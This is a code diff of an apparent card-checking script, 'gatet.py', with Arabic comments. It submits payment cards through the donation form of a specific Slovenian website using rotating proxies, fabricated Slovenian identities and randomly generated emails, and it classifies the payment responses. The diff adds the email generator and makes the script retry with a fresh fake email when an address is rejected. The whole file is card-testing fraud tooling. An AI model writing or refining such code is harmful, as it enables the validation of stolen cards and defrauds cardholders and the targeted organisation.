@@ -1,4 +1,4 @@
-# ==================== gatet.py (النسخة النهائية - البروكسيات الشغالة فقط) ====================
+# ==================== gatet.py (النسخة النهائية - تم حل مشكلة INVALID EMAIL ADDRESS) ====================
 
 import requests, json, re, random, sys, os, time, base64, uuid
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -57,8 +57,45 @@ def extract_reason(text):
         return match.group(1).strip()
     return None
 
+def generate_valid_email():
+    """توليد إيميل صالح بنطاقات مختلفة (لا تستخدم Gmail فقط للمواقع السلوفينية)"""
+    
+    # دومينات بريدية مقبولة عالمياً
+    domains = [
+        'gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com',
+        'icloud.com', 'protonmail.com', 'mail.com', 'yandex.com',
+        'seznam.cz', 'email.cz', 'post.cz', 'volny.cz', 'atlas.cz',
+        'centrum.cz', 'quick.cz', 'tiscali.cz', 'iol.cz'
+    ]
+    
+    # أسماء عشوائية
+    names = [
+        'janez', 'marija', 'marko', 'ana', 'peter', 'iva', 'miha', 'nina', 'tomaz', 'eva',
+        'janko', 'metka', 'rok', 'urska', 'luka', 'tilen', 'zala', 'neza', 'blaz', 'katja',
+        'tina', 'maja', 'ales', 'matej', 'simon', 'anja', 'damjan', 'vesna', 'goran', 'sara',
+        'ivan', 'helena', 'andrej', 'mojca', 'david', 'petra', 'gregor', 'teja', 'boris', 'julia'
+    ]
+    
+    # توليد إيميل بطول مناسب
+    name1 = random.choice(names)
+    name2 = random.choice(names)
+    number = random.randint(1, 9999)
+    domain = random.choice(domains)
+    
+    # صيغ مختلفة للإيميل لتجنب التكرار
+    formats = [
+        f"{name1}.{name2}{number}@{domain}",
+        f"{name1}{number}@{domain}",
+        f"{name1}_{name2}{number}@{domain}",
+        f"{name1}{name2}{number}@{domain}",
+        f"{name1}.{name2}.{number}@{domain}",
+    ]
+    
+    email = random.choice(formats)
+    return email.lower()
+
 def generate_realistic_si_data():
-    """توليد بيانات سلوفينية حقيقية (إيميلات Gmail فقط)"""
+    """توليد بيانات سلوفينية حقيقية مع إيميل صالح"""
     
     first_names_real = ['Alenka', 'Andrej', 'Anže', 'Barbara', 'Bojan', 'Damjan', 'Danijela', 'Darja', 'David', 'Dejan',
                         'Erik', 'Franc', 'Gregor', 'Helena', 'Igor', 'Irena', 'Jan', 'Janez', 'Jure', 'Katarina',
@@ -85,8 +122,8 @@ def generate_realistic_si_data():
     house_number = random.randint(1, 150)
     full_address = f"{street} {house_number}"
     
-    random_num = random.randint(100, 9999)
-    email = f"{first.lower()}.{last.lower()}{random_num}@gmail.com"
+    # استخدام الإيميل الجديد الصالح
+    email = generate_valid_email()
     
     companies = ['Mercator', 'Lidl', 'Hofer', 'Spar', 'Petrol', 'NLB', 'Telekom Slovenije']
     
@@ -130,6 +167,7 @@ def ch(ccx):
         r.verify = False
         
         print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
+        print(f"[*] Email used: {fake_data['email']}")
         
         # ================ بيانات الموقع ================
         SITE_URL = 'https://www.cujecnost.org'
@@ -395,15 +433,17 @@ def ch(ccx):
             if 'card not activated' in search_text:
                 return 'CARD NOT ACTIVATED'
             
-            # الردود الجديدة
             if 'no account' in search_text or 'no_account' in search_text or 'account not found' in search_text:
                 return 'NO ACCOUNT'
             
             if 'card restricted' in search_text or 'restricted card' in search_text:
                 return 'CARD RESTRICTED'
             
-            if 'veljaven' in search_text or 'e-poštni' in search_text:
-                return 'INVALID EMAIL ADDRESS'
+            # رسالة البريد الإلكتروني غير الصالح - تم تعديلها للتعامل معها بشكل أفضل
+            if 'veljaven' in search_text or 'e-poštni' in search_text or 'elektronski naslov' in search_text:
+                # محاولة إعادة المحاولة مع إيميل مختلف (بدل ما نرجع خطأ فوري)
+                print(f"[!] Email {billing_email} rejected, will retry with different email")
+                continue  # إعادة المحاولة مع إيميل جديد
             
             if 'declined' in search_text:
                 return 'DECLINED'
